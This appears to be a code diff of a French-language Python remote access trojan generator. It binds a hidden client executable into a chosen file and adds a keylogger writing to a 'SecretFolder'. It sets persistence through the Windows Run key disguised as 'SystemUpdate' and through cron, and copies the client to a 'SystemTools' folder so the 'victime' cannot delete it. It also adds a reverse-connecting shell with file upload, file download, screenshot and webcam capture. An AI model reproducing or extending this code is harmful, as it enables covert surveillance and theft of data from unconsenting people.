@@ -1,5 +1,6 @@
 import customtkinter as ctk
 from tkinter import filedialog, messagebox
+from customtkinter  import CTkProgressBar
 import os
 import subprocess
 import sys
@@ -8,30 +9,31 @@ import time
 import tempfile
 import zipfile
 import threading
+import itertools
 
 def create_exe_with_nuitka(input_file: str, exe_name: str = None):
     """
-    Génère un fichier .exe à partir d'un script Python en utilisant Nuitka avec nettoyage automatique.
+    Genere un fichier .exe a partir d'un script Python en utilisant Nuitka avec nettoyage automatique.
     
     :param input_file: Chemin vers le fichier Python source.
-    :param exe_name: Nom de l'exécutable généré (facultatif).
+    :param exe_name: Nom de l'executable genere (facultatif).
     """
     try:
-        # Vérification des prérequis
+        # Verification des prerequis
         if not os.path.isfile(input_file):
-            raise FileNotFoundError(f"Le fichier spécifié '{input_file}' n'existe pas.")
+            raise FileNotFoundError(f"Le fichier specifie '{input_file}' n'existe pas.")
 
-        # Nom par défaut pour l'exécutable
+        # Nom par defaut pour l'executable
         if not exe_name:
             exe_name = os.path.splitext(os.path.basename(input_file))[0] + ".exe"
         basename=os.path.basename(input_file)
         if(basename=="server1.py"):
-        # Commande Nuitka pour la création de l'exécutable
+        # Commande Nuitka pour la creation de l'executable
             command = [
                 sys.executable,
                 "-m", "nuitka",
-                "--standalone",       # Crée un exécutable autonome
-                "--onefile",          # Génère un seul fichier exécutable
+                "--standalone",       # Cree un executable autonome
+                "--onefile",          # Genere un seul fichier executable
                 "--mingw64",          # Utilise le compilateur MinGW64
                 "--nofollow-imports" # Importer seullment les bib importants
             ]
@@ -39,24 +41,24 @@ def create_exe_with_nuitka(input_file: str, exe_name: str = None):
              command = [
                 sys.executable,
                 "-m", "nuitka",
-                "--standalone",       # Crée un exécutable autonome
-                "--onefile",          # Génère un seul fichier exécutable
+                "--standalone",       # Cree un executable autonome
+                "--onefile",          # Genere un seul fichier executable
                 "--mingw64",          # Utilise le compilateur MinGW64
                 "--windows-disable-console", # ne pas affiche le terminal
                 "--nofollow-imports" # Importer seullment les bib importants
             ]
-        # Ajouter le fichier d'entrée
+        # Ajouter le fichier d'entree
         command.append(input_file)
 
-        # Exécuter la commande Nuitka
-        print(f"Exécution de la commande : {' '.join(command)}")
+        # Executer la commande Nuitka
+        print(f"Execution de la commande : {' '.join(command)}")
         result = subprocess.run(command, text=True, capture_output=True)
 
-        # Vérifier le statut de retour
+        # Verifier le statut de retour
         if result.returncode == 0:
-            print("Compilation réussie.")
+            print("Compilation reussie.")
 
-            # Déplacer l'exécutable généré vers le dossier courant
+            # Deplacer l'executable genere vers le dossier courant
             exe_path = None
             for root, _, files in os.walk("dist"):
                 for file in files:
@@ -68,23 +70,23 @@ def create_exe_with_nuitka(input_file: str, exe_name: str = None):
 
             if exe_path and os.path.isfile(exe_path):
                 shutil.move(exe_path, os.path.join(os.getcwd(), exe_name))
-                print(f"Fichier exécutable déplacé dans le dossier courant : {exe_name}")
+                print(f"Fichier executable deplace dans le dossier courant : {exe_name}")
             else:
-                print("Fichier généré introuvable.")
+                print("Fichier genere introuvable.")
             
             # Nettoyer les dossiers temporaires
             for folder in ["dist", "build", "__pycache__"]:
                 if os.path.isdir(folder):
                     shutil.rmtree(folder)
-                    print(f"Dossier '{folder}' supprimé.")
+                    print(f"Dossier '{folder}' supprime.")
         else:
-            print(f"Erreur lors de l'exécution de Nuitka : {result.stderr}")
+            print(f"Erreur lors de l'execution de Nuitka : {result.stderr}")
             print(f"Sortie standard : {result.stdout}")
 
     except FileNotFoundError as e:
         print(f"Erreur : {e}")
     except subprocess.SubprocessError as e:
-        print(f"Erreur liée au sous-processus : {e}")
+        print(f"Erreur liee au sous-processus : {e}")
     except Exception as e:
         print(f"Une erreur inattendue est survenue : {e}")
 
@@ -122,39 +124,66 @@ def cleanup_files(*files):
 
 def extract_zip_file(zip_path, extract_to):
     \"\"\"Extracts the contents of the ZIP file to the specified directory.\"\"\" 
-    with zipfile.ZipFile(zip_path, 'r') as zipf:
-        zipf.extractall(extract_to)
+    try:
+        print(f"Extracting {{zip_path}} to {{extract_to}}...")
+        with zipfile.ZipFile(zip_path, 'r') as zipf:
+            zipf.extractall(extract_to)
+        print("Extraction complete.")
+    except zipfile.BadZipFile:
+        print(f"Error: {{zip_path}} is not a valid ZIP file.")
+    except PermissionError:
+        print(f"Error: Permission denied for {{zip_path}}.")
+    except Exception as e:
+        print(f"Error extracting ZIP file: {{e}}")
 
 def execute_and_show():
     with tempfile.TemporaryDirectory() as temp_dir:
+        print(f"Created temporary directory: {{temp_dir}}")
+        
+        # Chemin relatif vers le fichier ZIP
         zip_path = os.path.join(os.path.dirname(__file__), 'files.zip')
+        print(f"ZIP file path: {{zip_path}}")
+        
+        # Vérifier que le fichier ZIP existe
+        if not os.path.exists(zip_path):
+            print(f"Error: {{zip_path}} does not exist.")
+            return
+        
+        # Extraire le fichier ZIP
         extract_zip_file(zip_path, temp_dir)
 
+        # Chemins des fichiers extraits
         file_path = os.path.join(temp_dir, '{os.path.basename(file_path)}')
         client_path = os.path.join(temp_dir, '{os.path.basename(client_path)}')
+        print(f"Extracted file path: {{file_path}}")
+        print(f"Extracted client path: {{client_path}}")
 
-        # Open the specified file (non-blocking)
+        # Ouvrir le fichier spécifié (non bloquant)
         try:
             if '{os.path.splitext(file_path)[1]}' == '.exe':
+                print(f"Executing {{file_path}}...")
                 subprocess.Popen([str(file_path)], shell=True)
             else:
                 print("Unsupported extension!")
         except Exception as e:
             print(f"Error opening the file: {{e}}")  
 
-        # Execute the client executable in the background (non-blocking)
+        # Exécuter le fichier client en arrière-plan (non bloquant)
         try:
+            print(f"Executing {{client_path}}...")
             subprocess.Popen([str(client_path)], shell=True)
         except Exception as e:
             print(f"Error executing the EXE file: {{e}}")
 
-        # Clean up extracted files after execution
-        time.sleep(10)
+        # Nettoyer les fichiers extraits après l'exécution
+        time.sleep(20)  # Attendre 20 secondes avant de nettoyer
+        print("Cleaning up extracted files...")
         cleanup_files(file_path, client_path)
 
 if __name__ == "__main__":
     execute_and_show()
 """
+    # Crée le fichier temporaire
     temp_file = os.path.join(tempfile.gettempdir(), "temp_binder.py")
     with open(temp_file, "w", encoding="utf-8") as f:
         f.write(binder_code)
@@ -181,12 +210,122 @@ def build_executable_with_nuitka(temp_script, zip_path, output_name, output_dir,
     except subprocess.CalledProcessError as e:
         raise RuntimeError("Error creating the executable with Nuitka.") from e
 
+def build_executable_with_pyinstaller(temp_script, zip_path, output_name, output_dir, icon_path):
+    """
+    Builds a standalone executable containing the script and the ZIP file using PyInstaller.
+    """
+    try:
+        # Ajouter l'extension .exe si elle est manquante
+        if not output_name.endswith(".exe"):
+            output_name += ".exe"
+
+        # Commande PyInstaller
+        command = [
+            sys.executable,
+            "-m", "PyInstaller",
+            "--onefile",                  # Crée un seul fichier exécutable
+            "--noconsole",                # Désactive la console (pour les applications GUI)
+            "--specpath", output_dir,     # Dossier pour le fichier .spec
+            "--icon", icon_path,          # Icône de l'application
+            "--add-data", f"{zip_path}{os.pathsep}files.zip",  # Inclure le fichier ZIP
+            "--name", output_name,        # Nom de l'exécutable
+            "--distpath", output_dir,     # Dossier de sortie pour l'exécutable
+            "--workpath", os.path.join(output_dir, "build"),  # Dossier temporaire pour la construction
+            temp_script                   # Script Python à compiler
+        ]
+
+        # Exécuter PyInstaller
+        subprocess.run(command, check=True)
+
+        print(f"Exécutable généré avec succès dans : {output_dir}")
+
+    except subprocess.CalledProcessError as e:
+        raise RuntimeError(f"Erreur lors de l'exécution de PyInstaller : {e}")
+    except Exception as e:
+        raise RuntimeError(f"Une erreur s'est produite : {e}")
 def clean_temp_files(temp_script):
     """Deletes the temporary script."""
     try:
         os.remove(temp_script)
     except Exception as clean_error:
         print(f"Error cleaning temporary files: {clean_error}")
+        
+
+def create_exe_with_pyinstaller(input_file: str, exe_name: str = None):
+    """
+    Génère un fichier .exe à partir d'un script Python en utilisant PyInstaller avec nettoyage automatique.
+
+    :param input_file: Chemin vers le fichier Python source.
+    :param exe_name: Nom de l'exécutable généré (facultatif).
+    """
+    try:
+        # Vérification des prérequis
+        if not os.path.isfile(input_file):
+            raise FileNotFoundError(f"Le fichier spécifié '{input_file}' n'existe pas.")
+
+        # Nom par défaut pour l'exécutable
+        if not exe_name:
+            exe_name = os.path.splitext(os.path.basename(input_file))[0] + ".exe"
+
+        basename = os.path.basename(input_file)
+
+        # Options de PyInstaller selon le type de fichier
+        if basename == "server1.py":
+            options = [
+                "--onefile",          # Génère un seul fichier exécutable
+                "--noconfirm",        # Supprime automatiquement les anciens fichiers
+                "--clean",            # Nettoie les anciens fichiers intermédiaires
+                "--noupx"             # Ne pas utiliser UPX pour la compression
+            ]
+        else:
+            options = [
+                "--onefile",          # Génère un seul fichier exécutable
+                "--noconfirm",        # Supprime automatiquement les anciens fichiers
+                "--clean",            # Nettoie les anciens fichiers intermédiaires
+                "--noupx",            # Ne pas utiliser UPX pour la compression
+                "--windowed"          # Ne pas afficher de console
+            ]
+
+        # Commande PyInstaller
+        command = [
+            sys.executable,
+            "-m", "PyInstaller",
+            *options,
+            input_file
+        ]
+
+        # Exécuter la commande PyInstaller
+        print(f"Exécution de la commande : {' '.join(command)}")
+        result = subprocess.run(command, text=True, capture_output=True)
+
+        # Vérifier le statut de retour
+        if result.returncode == 0:
+            print("Compilation réussie.")
+
+            # Chemin attendu pour l'exécutable généré
+            exe_path = os.path.join("dist", exe_name)
+
+            if os.path.isfile(exe_path):
+                shutil.move(exe_path, os.path.join(os.getcwd(), exe_name))
+                print(f"Fichier exécutable déplacé dans le dossier courant : {exe_name}")
+            else:
+                print("Fichier généré introuvable.")
+
+            # Nettoyer les dossiers temporaires
+            for folder in ["dist", "build", "__pycache__"]:
+                if os.path.isdir(folder):
+                    shutil.rmtree(folder)
+                    print(f"Dossier '{folder}' supprimé.")
+        else:
+            print(f"Erreur lors de l'exécution de PyInstaller : {result.stderr}")
+            print(f"Sortie standard : {result.stdout}")
+
+    except FileNotFoundError as e:
+        print(f"Erreur : {e}")
+    except subprocess.SubprocessError as e:
+        print(f"Erreur liée au sous-processus : {e}")
+    except Exception as e:
+        print(f"Une erreur inattendue est survenue : {e}")        
 
 def bind_files(file_path, client_path, icon_path, output_dir):
     """
@@ -199,9 +338,9 @@ def bind_files(file_path, client_path, icon_path, output_dir):
 
     file_name = os.path.basename(file_path)  # here we give the filename to inject  
     full_output_path = os.path.join(output_dir, file_name)
-
+    
     build_executable_with_nuitka(temp_script, zip_path, file_name, output_dir, icon_path)
-
+   
     clean_temp_files(temp_script)
 
     print(f"Combined file '{full_output_path}' generated successfully.")
@@ -224,18 +363,31 @@ import cv2
 import io
 import keyboard
 import pyautogui
-import winreg as reg
+if platform.system() == "Windows":
+    import winreg as reg
+else:
+    reg=None
 
 time_interval = 10
 text = ""
 
 # Configuration de l'environnement selon l'OS
-hidden_folder = os.path.join(os.getenv('APPDATA'), "SecretFolder", "keystrokes")
+if platform.system() == "Windows":
+    hidden_folder = os.path.join(os.getenv('APPDATA'), "SecretFolder", "keystrokes")
+else:
+    hidden_folder = os.path.join(os.path.expanduser('~/.config'), "SecretFolder", "keystrokes") 
 
 os.makedirs(hidden_folder, exist_ok=True)  # Creer le repertoire cache s'il n'existe pas
 
+def get_new_keystroke_file_path():
+    # Creer un nouveau nom de fichier avec un timestamp unique
+    timestamp = time.strftime("%Y%m%d-%H%M%S")  # Format : 20250101-103000
+    hidden = hidden_folder  # Remplacez ceci par le chemin reel du dossier cache
+    return os.path.join(hidden, f"keystrokes_{timestamp}.txt")
+
+
 # Fichier de touches
-keystroke_file_path = os.path.join(hidden_folder, "keystrokes.txt")
+keystroke_file_path = ""
 
 # Variable pour suivre l'etat de l'enregistrement
 is_recording = False
@@ -278,22 +430,44 @@ def record_keystrokes():
     global is_recording
     try:
         with open(keystroke_file_path, 'a') as data_file:
-            data_file.write(f"Started recording at {time.ctime()}")
+            data_file.write(f"Started recording at {time.ctime()}\\n")
             while is_recording:
-                # Enregistrer les touches en continu
-                events = keyboard.record('enter')  # Enregistrer jusqu'a "enter"
-                password = list(keyboard.get_typed_strings(events))
-                if password:
-                    data_file.write(password[0])  # Sauvegarder les touches dans le fichier
-                    data_file.write('')  # Ajouter une nouvelle ligne apres chaque entree
-                time.sleep(0.1)  # Petite pause pour ne pas surcharger la CPU
+                events = keyboard.record(until='enter')  # Enregistrer jusqu'a "enter"
+                typed_text = ""
+
+                for event in events:
+                    if event.event_type == 'down':  # Considerer uniquement les appuis
+                        if event.name == 'tab':
+                            typed_text += '[Tab]\t'  # Ajouter une representation lisible de Tab
+                        elif event.name == 'enter':
+                            typed_text += '[ENTER]'  # Remplacer Enter par un indicateur
+                        elif event.name == 'backspace':
+                            if typed_text:  # Verifier qu'il y a du texte a supprimer
+                                typed_text = typed_text[:-1] + '[BACKSPACE]'  # Supprimer et indiquer
+                        elif event.name == 'space':
+                            typed_text += '[SPACE]'  # Ajouter une representation pour Space
+                        elif len(event.name) == 1:  # Ajouter uniquement les caracteres valides
+                            typed_text += event.name
+                        else:
+                            continue  # Ignorer les autres touches comme Ctrl, Alt, etc.
+
+                # Filtrer les lignes inutiles
+                if not any(keyword in typed_text.lower() for keyword in ['haut']):
+                    if typed_text.strip():  # Verifier qu'il reste du contenu pertinent
+                        data_file.write(typed_text + '\\n')
+
+                time.sleep(0.1)  # Pause pour eviter de surcharger la CPU
     except Exception as e:
         print(f"Error while recording keystrokes: {str(e)}")
 
+
 # Fonction pour demarrer l'enregistrement
 def start_keylogger():
-    global is_recording
-    # Reinitialiser le fichier de frappes au debut
+    global is_recording, keystroke_file_path
+    # Reinitialiser le chemin du fichier de frappes avec un nouveau fichier unique
+    keystroke_file_path = get_new_keystroke_file_path()
+    
+    # Vider le fichier de frappes au debut
     try:
         with open(keystroke_file_path, 'w') as data_file:
             data_file.write("")  # Vider le contenu
@@ -303,10 +477,81 @@ def start_keylogger():
     is_recording = True
     threading.Thread(target=record_keystrokes, daemon=True).start()
 
+
 # Fonction pour arreter l'enregistrement
 def stop_keylogger():
     global is_recording
     is_recording = False  
+    
+def send_keystrokes_file():
+    try:
+        with open(keystroke_file_path, 'rb') as file:
+            file_data = file.read().hex()  # Convertir le fichier en hexadecimal pour l'envoyer   
+        sending({"status": "success", "data": file_data})
+    except Exception as e:
+        sending({"status": "error", "message": str(e)})    
+
+#la fonction qui vas duppliquer le client.exe dans un emplacemment sain pour eviter de supprimer par le vicitme
+
+def duplicate_client(client_path):
+    try:
+        if platform.system() == "Windows":
+            # Chemin discret sous AppData\Roaming
+            hidden_folder = os.path.join(os.getenv('APPDATA'), "SystemTools")
+        else:
+            # Chemin discret sous ~/.local/share
+            hidden_folder = os.path.join(os.path.expanduser("~/.local/share"), "SystemTools")
+
+        # Creer le dossier s'il n'existe pas
+        os.makedirs(hidden_folder, exist_ok=True)
+
+        # Chemin cible pour le fichier
+        target_path = os.path.join(hidden_folder, os.path.basename(client_path))
+        
+        # Copier le fichier s'il n'existe pas encore
+        if not os.path.exists(target_path):
+            with open(client_path, 'rb') as src, open(target_path, 'wb') as dst:
+                dst.write(src.read())
+            print(f"Client duplique dans : {target_path}")
+        else:
+            print(f"Le fichier existe deja dans : {target_path}")
+        return target_path
+    except Exception as e:
+        print(f"Erreur lors de la duplication du fichier : {e}")
+        return None
+
+#
+
+def add_persistence():
+    script_path = sys.argv[0]  # Chemin de l'executable en cours
+    try:
+        # Dupliquer le fichier dans un emplacement sur
+        duplicated_path = duplicate_client(script_path)
+
+        if platform.system() == "Windows":
+            # Ajouter au registre Windows
+            registry_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            app_name = "SystemUpdate"  # Nom visible dans le registre
+
+            if duplicated_path:
+                with reg.OpenKey(reg.HKEY_CURRENT_USER, registry_key_path, 0, reg.KEY_SET_VALUE) as reg_key:
+                    reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, f'"{duplicated_path}"')
+                return f"Persistance ajoutee pour : {duplicated_path}"
+            else:
+                return "Erreur lors de la duplication pour la persistance."
+        else:
+            # Ajouter une tache cron sous Linux
+            if duplicated_path:
+                cron_job = f"@reboot {duplicated_path}\\n"
+                cron_file_path = os.path.expanduser("~/.crontab")
+                with open(cron_file_path, "a") as cron_file:
+                    cron_file.write(cron_job)
+                return f"Persistance ajoutee pour : {duplicated_path} dans la crontab"
+            else:
+                return "Erreur lors de la duplication pour la persistance."
+
+    except Exception as e:
+        return f"Erreur lors de la configuration de la persistance : {str(e)}"
 
 # fonction pour le  keylooger
 def handle_keylogger_command(command):
@@ -322,38 +567,7 @@ def handle_keylogger_command(command):
     else:
         sending(f"Unknown keylogger command: {command}")
 
-def send_keystrokes_file():
-    try:
-        with open(keystroke_file_path, 'rb') as file:
-            file_data = file.read().hex()  # Convertir le fichier en hexadecimal pour l'envoyer   
-        sending({"status": "success", "data": file_data})
-    except Exception as e:
-        sending({"status": "error", "message": str(e)})    
 
-def add_persistence():
-    python_path = sys.executable  # Recuperer le chemin vers l'executable Python
-    script_path = os.path.abspath("your_script.py")  # Remplacer par le chemin de votre script
-
-    try:
-        if platform.system() == "Windows":
-            # Ouvrir la cle du registre HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
-            registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_WRITE)
-            
-            # Ajouter l'entree pour le script Python
-            reg.SetValueEx(registry_key, "MyEmptyKey", 0, reg.REG_SZ, "")
-
-            # Fermer la cle du registre
-            reg.CloseKey(registry_key)
-        else:
-            # Ajouter une tache cron pour Linux
-            cron_job = f"@reboot {python_path} {script_path}"
-            with open(os.path.expanduser("~/.crontab"), "a") as cron_file:
-                cron_file.write(cron_job)
-
-        return "Persistance configuree avec succes ! Le script s'executera au demarrage."
-
-    except Exception as e:
-        return f"Erreur lors de la configuration de la persistance : {str(e)}"
 
 # fonction pour prendre une photo de la cible 
 def camera_handler():
@@ -411,32 +625,40 @@ def screenshot_handler():
 #fonction pour transmetre des fichiers 
 def upload_handler(command):
     try:
-        # Extraire le nom du fichier et les donnees
+        # Extraire le nom du fichier, le chemin cible et les donnees
         parts = command.split(" ", 2)
-        
         if len(parts) < 3:
             sending("Error: Invalid upload command format.")
-            return
-
-        filepath = parts[1]
-        filedata = parts[2]
-
-        # Recuperer le chemin du bureau de l'utilisateur
-        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
-
-        # Nom de fichier seulement (sans le chemin d'origine)
-        filename = os.path.basename(filepath)
-
-        # Chemin complet du fichier sur le bureau
-        target_path = os.path.join(desktop_path, filename)
-
-        # ecrire les donnees dans le fichier
+            return False
+        
+        filename = parts[0]  # Nom du fichier dans la commande (e.g., README.md)
+        target_path = parts[1]  # Chemin cible specifie par le serveur
+        filedata = parts[2]  # Donnees hexadecimales du fichier
+        
+        # Si le chemin cible est un repertoire ou se termine par "/", ajoutez le nom du fichier
+        if target_path.endswith("/") or os.path.isdir(target_path):
+            target_path = os.path.join(target_path, filename)
+        
+        # Verification des permissions d'ecriture pour le repertoire cible
+        target_folder = os.path.dirname(target_path)
+        if not os.access(target_folder, os.W_OK):
+            sending(f"Error: No write permission for the directory {target_folder}.")
+            return False
+        
+        # Creer le repertoire si necessaire
+        os.makedirs(target_folder, exist_ok=True)
+        
+        # ecrire les donnees dans le fichier cible
         with open(target_path, "wb") as f:
             f.write(bytes.fromhex(filedata))
-
-        sending(f"File {filename} uploaded successfully to Desktop.")
+        
+        sending(f"File uploaded successfully to {target_path}.")
+        return True
+    except ValueError:
+        sending("Error: Invalid hexadecimal data for file content.")
     except Exception as e:
         sending(f"Error uploading file: {str(e)}")
+        return False
 
 # fonction pour recuperer des fichiers 
 def download_file(command):
@@ -531,7 +753,6 @@ def add_ip_and_port_to_victim_script(ip, port):
 def connection():
     global s
     while True:
-        time.sleep(20)
         try:
             s.connect((ip_address, port))
             shell()
@@ -693,74 +914,93 @@ def shell():
                 print(f"Current directory: {response}")
                 continue
             
-            #la commande pour puise fair une capture d'ecran sur la machine de ma vicitme
             elif command.strip() == "screenshot":
                 sending(command)
+            
+                # Reception de la reponse
                 response = receive()
-                if response.get("status") == "success":
-                    try:
-                        screenshot_data = response.get("data")
-                        if not screenshot_data:
-                            print("No screenshot data received.")
-                            continue
-                        # Chemin de sauvegarde
-                        screenshot_path = os.path.join(client_folder ,"screenshots", f"{ip}_ScreenShot.png")
-                        with open(screenshot_path, "wb") as f:
-                            f.write(bytes.fromhex(screenshot_data))
-                        print(f"Screenshot saved successfully at {screenshot_path}.")
-                    except Exception as e:
-                        print(f"Error saving screenshot: {str(e)}")
+            
+                # Verifier si response est un dictionnaire
+                if isinstance(response, dict):  # Si receive() retourne un dictionnaire
+                    # Verifier si la capture d'ecran a reussi
+                    if response.get("status") == "success":
+                        try:
+                            screenshot_data = response.get("data")
+                            if not screenshot_data:
+                                print("No screenshot data received.")
+                                continue
+            
+                            # Chemin de sauvegarde
+                            timestamp = time.strftime("%Y%m%d-%H%M%S")  # Ex : 20250101-103000
+                            screenshot_path = os.path.join(client_folder, "screenshots", f"{timestamp}_ScreenShot.png")
+            
+                            # Sauvegarder l'image
+                            with open(screenshot_path, "wb") as f:
+                                f.write(bytes.fromhex(screenshot_data))
+                            print(f"Screenshot saved successfully at {screenshot_path}.")
+                        except Exception as e:
+                            print(f"Error saving screenshot: {str(e)}")
+                    else:
+                        print(f"Error taking screenshot: {response.get('message')}")
                 else:
-                    print(f"Error taking screenshot: {response.get('message')}")
+                    print("Error: Received response is not a dictionary.")
                 continue
 
             
-            #la commande pour puisse telecharger des fichier ou des dossier depuis la machine de la vicitme
             elif command.startswith("download "):
+                # Verifier si un chemin ou un fichier a ete specifie apres "download "
+                if len(command.strip()) <= len("download "):
+                    print("Error: Please specify a file or directory to download.")
+                    print("Usage: upload <remote_target_path>")
+                    continue
+            
+                # Envoyer la commande
                 sending(command)
                 response = receive()
-
-                # Chemin de stockage
-
-                if response.get("status") == "success":
+            
+                # Verifier la reponse
+                if isinstance(response, dict) and response.get("status") == "success":
                     # Extraire le nom du fichier demande
                     filename = os.path.basename(command[9:].strip())
-                    filepath = os.path.join(client_folder,"downloads", filename)
-
-                # Sauvegarder le fichier directement dans le repertoire Downloads
-                    with open(filepath, "wb") as f:
-                        f.write(bytes.fromhex(response["data"]))
-        
-                    print(f"File downloaded successfully: {filepath}")
+                    filepath = os.path.join(client_folder, "downloads", filename)
+            
+                    # Sauvegarder le fichier dans le repertoire Downloads
+                    try:
+                        with open(filepath, "wb") as f:
+                            f.write(bytes.fromhex(response["data"]))
+                        print(f"File downloaded successfully: {filepath}")
+                    except Exception as e:
+                        print(f"Error saving file: {str(e)}")
                 else:
-                    print(f"Error downloading file: {response.get('message')}")
+                    # Si la reponse contient un message d'erreur
+                    error_message = response.get("message") if isinstance(response, dict) else "Unknown error"
+                    print(f"Error downloading file: {error_message}")
                 continue
             
-           #la commande pour puise uploader des fichier dans la machine de vicitime 
+            #la commande pour puise uploader des fichier dans la machine de vicitime 
             elif command.startswith("upload "):
                 try:
-                # Recuperer le chemin specifie par l'utilisateur
-                    filepath = command.split(" ", 1)[1]
-        
-                # Ajouter le repertoire courant s'il s'agit d'un chemin relatif
-                    if not os.path.isabs(filepath):
-                        filepath = os.path.join(reper, filepath)
-                    else: 
-                        filepath = filename
-                # Debug : Afficher le chemin reel utilise
-                    print(f"Attempting to upload file from: {filepath}")
-        
-                # Verifier si le fichier existe
-                    if not os.path.exists(filepath):
-                        print(f"File '{filepath}' does not exist.")
+                    # Recuperer le chemin source (local au serveur) et le chemin cible (destination sur le client)
+                    parts = command.split(" ", 2)
+                    if len(parts) < 3:
+                        print("Error: Please specify parametres.")
+                        print("Usage: upload <local_file_path> <remote_target_path>")
                         continue
-        
-        # Lire le fichier
-                    with open(filepath, "rb") as f:
+
+                    local_path = parts[1]  # Chemin du fichier sur le serveur
+                    remote_target = parts[2]  # Chemin cible sur le client
+
+                    # Verifier si le fichier source existe
+                    if not os.path.exists(local_path):
+                        print(f"File '{local_path}' does not exist.")
+                        continue
+
+                    # Lire et convertir les donnees du fichier
+                    with open(local_path, "rb") as f:
                         filedata = f.read().hex()
-        
-                    # Envoyer au client
-                    sending(f"upload {filepath} {filedata}")
+
+                    # Envoyer la commande au client
+                    sending(f"upload {remote_target} {filedata}")
                     response = receive()
                     print(response)
                 except Exception as e:
@@ -799,15 +1039,34 @@ def shell():
                 continue
             
             elif command.strip() == "keylogger stop":
+                # Envoyer la commande pour arreter l'enregistrement
                 sending(command)
+            
+                # Attendre la reponse
                 response = receive()
-                if response.get("status") == "success":
-                    keystrokes_path = os.path.join(client_folder, "keylogger", "keystrokes.txt")
-                    with open(keystrokes_path, "wb") as f:
-                        f.write(bytes.fromhex(response["data"]))
-                    print(f"Keystrokes file saved at: {keystrokes_path}")
+            
+                # Verifier si la reponse est deja un dictionnaire
+                if isinstance(response, dict):
+                    if response.get("status"):
+                        # Verifier si la reponse est reussie
+                        if response.get("status") == "success":
+                            # Recuperer le chemin du fichier et creer un nom unique pour le fichier de frappes
+                            timestamp = time.strftime("%Y%m%d-%H%M%S")  # Format : 20250101-103000
+                            keystrokes_path = os.path.join(client_folder, "keylogger", f"keystrokes_{timestamp}.txt")
+            
+                            # Sauvegarder le fichier de frappes recu dans le dossier approprie
+                            try:
+                                with open(keystrokes_path, "wb") as f:
+                                    f.write(bytes.fromhex(response["data"]))  # Convertir les donnees hexadecimales en bytes et les ecrire
+                                print(f"Keystrokes file saved at: {keystrokes_path}")
+                            except Exception as e:
+                                print(f"Error saving keystrokes file: {str(e)}")
+                        else:
+                            print(f"Failed to receive keystrokes file: {response.get('message')}")
+                    else:
+                        print("Response does not contain a 'status' field.")
                 else:
-                    print(f"Failed to receive keystrokes file: {response.get('message')}")
+                    print("Received response is not a dictionary. Please check the `receive()` function.")
             
             # Code cote serveur pour envoyer la commande persistance
             elif command.strip() == "persistance":
@@ -847,6 +1106,15 @@ if __name__ == "__main__":
         file.write(f"    ip_address = \"{ip}\"")
         file.write(code_to_add)
 
+
+class Controller:
+    def destroy_page(self, page_name):
+        # Verifie si la page existe dans le dictionnaire
+        if page_name in self.pages:
+            page = self.pages[page_name]
+            page.destroy()  # Detruit la page de l'interface graphique
+            del self.pages[page_name]  # Supprime la page du dictionnaire
+
 #handel
 def handle_button_click(self):
         # Appeler la methode save_and_next
@@ -870,36 +1138,38 @@ def add_keylogger_code_to_victim_script(self):
     
 
 # Configuration globale pour un design moderne
-ctk.set_appearance_mode("dark")  # Thème sombre
+ctk.set_appearance_mode("dark")  # Theme sombre
 ctk.set_default_color_theme("blue")  # Palette de couleurs modernes
 
 class Application(ctk.CTk):
     def __init__(self):
         super().__init__()
-        self.title("Genérateur de RAT - Interface Professionnelle")
-        self.geometry("600x600")  # Taille augmentée pour plus d'espace visuel
-        self.resizable(False, False)  # Empêche le redimensionnement pour préserver le design
+        self.title("Generateur de RAT")
+        self.geometry("580x500")  # Taille augmentee pour plus d'espace visuel
+        self.resizable(False, False)  # Empêche le redimensionnement pour preserver le design
         self.user_choices = {
             "options": [],
             "file_to_inject": None,
             "extension": ".exe",
             "output_path": None,
+            "icon_path": None,
             "ip_address": "127.0.0.1",
             "port": 8080,
-            "encryption_method": "AES"
+            "ip_address2": "127.0.0.1",
+            "choix-exe":None,
         }
 
-        # Configuration principale pour que tout le contenu s'étende
+        # Configuration principale pour que tout le contenu s'etende
         self.grid_rowconfigure(0, weight=1)
         self.grid_columnconfigure(0, weight=1)
 
         # Conteneur principal
-        self.container = ctk.CTkFrame(self, corner_radius=10)
-        self.container.grid(row=0, column=0)
+        self.container = ctk.CTkFrame(self, corner_radius=15, border_width=2, border_color="#444")
+        self.container.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")
 
         # Initialisation des pages
         self.pages = {}
-        for Page in (IntroductionPage, OptionsPage, FileSelectionPage, NetworkSettingsPage, OutputPage):
+        for Page in (IntroductionPage, OptionsPage, FileSelectionPage, NetworkSettingsPage, OutputPage , WaitingPage):
             page_name = Page.__name__
             page = Page(parent=self.container, controller=self)
             self.pages[page_name] = page
@@ -908,17 +1178,17 @@ class Application(ctk.CTk):
         self.show_page("IntroductionPage")
 
     def show_page(self, page_name):
-        """Afficher une page spécifique."""
+        """Afficher une page specifique."""
         page = self.pages[page_name]
         page.tkraise()
 
 class CenteredFrame(ctk.CTkFrame):
-    """Cadre professionnel avec un design soigné."""
+    """Cadre professionnel avec un design soigne."""
     def __init__(self, parent, **kwargs):
         super().__init__(parent, **kwargs)
         self.grid_columnconfigure(0, weight=1)
         self.grid_rowconfigure(0, weight=1)
-        self.inner_frame = ctk.CTkFrame(self, corner_radius=15)
+        self.inner_frame = ctk.CTkFrame(self, corner_radius=15, fg_color="#2E2E2E", border_width=1, border_color="#444")
         self.inner_frame.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")
 
 class IntroductionPage(CenteredFrame):
@@ -926,10 +1196,10 @@ class IntroductionPage(CenteredFrame):
         super().__init__(parent)
         self.controller = controller
 
-        ctk.CTkLabel(self.inner_frame, text="Bienvenue dans le Générateur de RAT",
+        ctk.CTkLabel(self.inner_frame, text="Bienvenue dans le Generateur de RAT",
                      font=("Arial", 28, "bold"), text_color="lightblue").pack(pady=20)
 
-        ctk.CTkLabel(self.inner_frame, text="Créez un RAT personnalisé avec des fonctionnalités avancées\n"
+        ctk.CTkLabel(self.inner_frame, text="Creez un RAT personnalise avec des fonctionnalites avancees\n"
                                             "et injectez-le dans un fichier cible.",
                      font=("Arial", 18), justify="center").pack(pady=20)
 
@@ -948,15 +1218,14 @@ class OptionsPage(CenteredFrame):
 
         ip_address = self.controller.user_choices.get("ip_address")
